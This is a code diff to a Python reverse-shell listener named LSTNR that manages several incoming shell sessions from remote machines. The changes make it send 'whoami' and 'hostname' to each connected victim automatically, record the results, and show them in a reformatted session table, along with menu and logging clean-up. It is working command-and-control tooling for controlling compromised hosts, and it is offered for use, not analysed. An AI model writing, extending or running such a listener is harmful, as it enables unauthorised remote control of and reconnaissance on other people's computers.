@@ -5,6 +5,8 @@ import sys  # Gives access to system-specific parameters and functions
 import queue  # Implements a FIFO queue, used for handling notifications
 import time  # Used for timestamps and delays
 import os  # Provides OS-related functions like file handling
+import subprocess  # To run shell commands and capture output
+import re
 #import readline  # Allows command history functionality
 
 # ANSI escape codes for colors
@@ -35,6 +37,11 @@ os.makedirs(LOG_DIR, exist_ok=True)  # Ensure the directory exists
 
 LOG_FILE = os.path.join(LOG_DIR, f"{time.strftime('%Y-%m-%d_%H-%M-%S')}-sessions.log")
 
+def clean_output(output):
+    """Cleans the output by removing the command prompt part (if any)."""
+    # Remove Windows PowerShell or Command Prompt prompts like 'PS C:\Users\username>'
+    cleaned_output = re.sub(r'PS\s.*?>\s*$', '', output)
+    return cleaned_output.strip()
 
 # Initialize logging to a file
 def init_log_file():
@@ -57,7 +64,7 @@ def print_error(error_message):
 
 def print_menu():
     """Prints a formal list of available commands."""
-    message = f"""{ORANGE}╔════════════════════════════════════════════════════════════╗
+    message = f"""{ORANGE}\n╔════════════════════════════════════════════════════════════╗
 ║                     AVAILABLE COMMANDS                     ║
 ╠════════════════════════════════════════════════════════════╣
 ║ help  | ? - Show this help menu                            ║
@@ -69,7 +76,6 @@ def print_menu():
 ╚════════════════════════════════════════════════════════════╝{RESET}"""
     print(message)
     log_to_file("Displayed menu.")
-
 def handle_client(client_socket, addr, session_number):
     """Creates a fully interactive reverse shell with real-time output."""
     print(f"{GREEN}[+] Session {session_number} connected from {addr}{RESET}")
@@ -101,19 +107,39 @@ def handle_client(client_socket, addr, session_number):
     recv_thread.start()
 
     try:
+        # Only fetch whoami and hostname if they are not already set
+        with lock:
+            if session_number not in sessions:
+                sessions[session_number] = {}
+            
+            if "whoami" not in sessions[session_number]:
+                client_socket.sendall(b"whoami\n")
+                whoami_output = client_socket.recv(4096).decode(errors="ignore").strip()
+                whoami_output = clean_output(whoami_output)  # Clean the output from command prompt
+                sessions[session_number]["whoami"] = whoami_output
+                print(f"{ORANGE}Captured whoami: {whoami_output}{RESET}")
+                log_to_file(f"Captured whoami: {whoami_output}")
+            
+            if "hostname" not in sessions[session_number]:
+                client_socket.sendall(b"hostname\n")
+                hostname_output = client_socket.recv(4096).decode(errors="ignore").strip()
+                hostname_output = clean_output(hostname_output)  # Clean the output from command prompt
+                sessions[session_number]["hostname"] = hostname_output
+                print(f"{ORANGE}Captured hostname: {hostname_output}{RESET}")
+                log_to_file(f"Captured hostname: {hostname_output}")
+
         while True:
             command = sys.stdin.readline().strip()  # Read user input properly
 
             # Log the user input command
             if command:
                 log_to_file(f"Command: {command}")
-
+                # readline.add_history(command) # couldn't get to work properly
             if command.lower() == "bs":
                 print(f"{ORANGE}[*] Session {session_number} moved to background.{RESET}")
                 log_to_file(f"[*] Session {session_number} moved to background.")
                 stop_event.set()
                 return
-
             if command.lower() == "die":
                 print(f"{ORANGE}[-] Terminating session {session_number}.{RESET}")
                 log_to_file(f"[-] Terminating session {session_number}.")
@@ -124,7 +150,7 @@ def handle_client(client_socket, addr, session_number):
                     client_socket.close()
                 except OSError:
                     pass  # Ignore socket already closed errors
-
+                
                 with lock:
                     del sessions[session_number]
                 return
@@ -151,6 +177,26 @@ def handle_client(client_socket, addr, session_number):
     with lock:
         del sessions[session_number]
 
+def format_session_table(sessions):
+    """Formats the session table with fixed padding and alignment."""
+    
+    # Define fixed width for each column
+    id_width = 5
+    ip_width = 18
+    user_width = 30
+    hostname_width = 30
+
+    # Create a formatted table header
+    table = f"\n{'ID'.ljust(id_width)}{'IP ADDRESS'.ljust(ip_width)}{'USER'.ljust(user_width)}{'HOSTNAME'.ljust(hostname_width)}\n"
+
+    # Loop through the sessions to format each row
+    for session in sessions:
+        table += f"{str(session['id']).ljust(id_width)}{session['ip'].ljust(ip_width)}{session['user'].ljust(user_width)}{session['hostname'].ljust(hostname_width)}\n"
+
+    return table
+
+
+
 def session_manager():
     """Main menu that allows session management."""
     time.sleep(1)  # wait for 1 second before dropping into LSTNR$
@@ -158,87 +204,48 @@ def session_manager():
     while True:
         try:
             while not notifications.empty():
-                print(notifications.get())  # Display notifications, like new session messages
+                print(notifications.get())
 
-            command = input(f"{BLUE}LSTNR$ {RESET}").strip()  # Prompt for command input
+            command = input(f"{BLUE}LSTNR$ {RESET}").strip()
             
             # Log the command input
             log_to_file(f"LSTNR$ {command}")
             
             if command == "":
-                print_menu()  # Display the menu if the command is empty
+                print_menu()  
             elif command == "help":
-                print_menu()  # Show the menu when 'help' is typed
+                print_menu()
             elif command == "?":
-                print_menu()  # Show the menu when '?' is typed
+                print_menu()
             elif command.lower() == "ls":
-                # Display active sessions
-                while not notifications.empty():
-                    print(notifications.get())
-
-                print(f"{ORANGE}╔════════════════════════════════════════════════════════════╗")
-                print(f"║ ID  ║ IP ADDRESS      ║ USER            ║ HOSTNAME         ║")
-                print(f"╠════════════════════════════════════════════════════════════╣")
-                session_list = ""
+                # Prepare the session list in a formatted way
+                session_list = []
                 for sid, session in sessions.items():
-                    user = session.get("user", "N/A")  # Fetch user info (whoami)
-                    hostname = session.get("hostname", "N/A")  # Fetch hostname info
-                    session_list += f"║ {sid:<3} ║ {session['addr'][0]:<15} ║ {user:<15} ║ {hostname:<16} ║\n"
-                    print(f"║ {sid:<3} ║ {session['addr'][0]:<15} ║ {user:<15} ║ {hostname:<16} ║")
-                print(f"╚════════════════════════════════════════════════════════════╝{RESET}")
+                    session_list.append({
+                        "id": sid,
+                        "ip": session["addr"][0],
+                        "user": session.get('whoami', 'N/A'),
+                        "hostname": session.get('hostname', 'N/A')
+                    })
+
+                # Now print the formatted session table
+                formatted_table = format_session_table(session_list)
+                print(formatted_table)
 
                 # Log the session table into the file
                 log_to_file("Session list displayed:")
-                log_to_file("╔════════════════════════════════════════════════════════════╗")
-                log_to_file("║ ID  ║ IP ADDRESS      ║ USER            ║ HOSTNAME         ║")
-                log_to_file("╠════════════════════════════════════════════════════════════╣")
-                log_to_file(session_list)
-                log_to_file("╚════════════════════════════════════════════════════════════╝\n")
-
+                log_to_file(formatted_table)
+                
             elif command.startswith("cs "):
-                # Connect to a specific session using session ID
                 try:
-                    sid = int(command.split()[1])  # Extract session ID
+                    sid = int(command.split()[1])
                     if sid in sessions:
-                        session = sessions[sid]
-
-                        # Only run `whoami` and `hostname` the first time the session is accessed
-                        if not session.get("user_updated", False) or not session.get("hostname_updated", False):
-                            # Run whoami and hostname commands
-                            session["user_updated"] = True
-                            session["hostname_updated"] = True
-
-                            # Get user and hostname
-                            client_socket = session['socket']
-                            client_socket.sendall(b"whoami\n")
-                            user = client_socket.recv(4096).decode(errors="ignore").strip()
-
-                            client_socket.sendall(b"hostname\n")
-                            hostname = client_socket.recv(4096).decode(errors="ignore").strip()
-
-                            # Update session with fetched details
-                            session["user"] = user
-                            session["hostname"] = hostname
-                            print(f"{GREEN}[+] Updated user to: {user}, hostname to: {hostname}{RESET}")
-                            log_to_file(f"[+] Updated user to: {user}, hostname to: {hostname}")
-                        
-                        # Proceed with handling the session interactively
-                        handle_client(session['socket'], session['addr'], sid)
-
+                        handle_client(sessions[sid]['socket'], sessions[sid]['addr'], sid)
                     else:
                         print_error("Invalid session ID.")
                 except:
                     print_error("Invalid command. Usage: cs <session_id>")
-
-            elif command.lower() == "bs":
-                # Background the current session
-                print(f"{ORANGE}[*] Session moved to background.{RESET}")
-                log_to_file(f"[*] Session moved to background.")
-                # Background logic if needed, in this case, nothing specific is handled for 'bs'
-                pass
-
             elif command.lower() == "die":
-                # Terminate all sessions
                 print(f"{RED}[!] Terminating all sessions.{RESET}")
                 log_to_file("[!] Terminating all sessions.")
                 with lock:
@@ -248,24 +255,17 @@ def session_manager():
                         del sessions[sid]
                 print(f"{ORANGE}[+] All sessions terminated.{RESET}")
                 log_to_file("[+] All sessions terminated.")
-
             elif command.lower() == "exit":
-                # Shut down the listener and terminate all sessions
                 print(f"{RED}[!] Killing all sessions.{RESET}")
                 print(f"{ORANGE}[+] Shutting down LSTNR.{RESET}")
                 log_to_file("[!] Killing all sessions. Shutting down LSTNR.")
-                break  # Exit the listener
-
+                break
             else:
-                # Handle unknown commands
-                print(f"{RED}[!] Unknown command: {command}{RESET}")
-                log_to_file(f"[!] Unknown command: {command}")
-
+                print_menu()
         except KeyboardInterrupt:
             print(f"\n{RED}[!] Type 'exit' to close LSTNR.{RESET}")
         except Exception as e:
             print_error(str(e))
-
 
 def start_listener():
     """Starts the listener and accepts incoming connections."""
@@ -335,3 +335,4 @@ if __name__ == "__main__":
         sys.exit(0)
     except Exception as e:
         print_error(str(e))
+                          
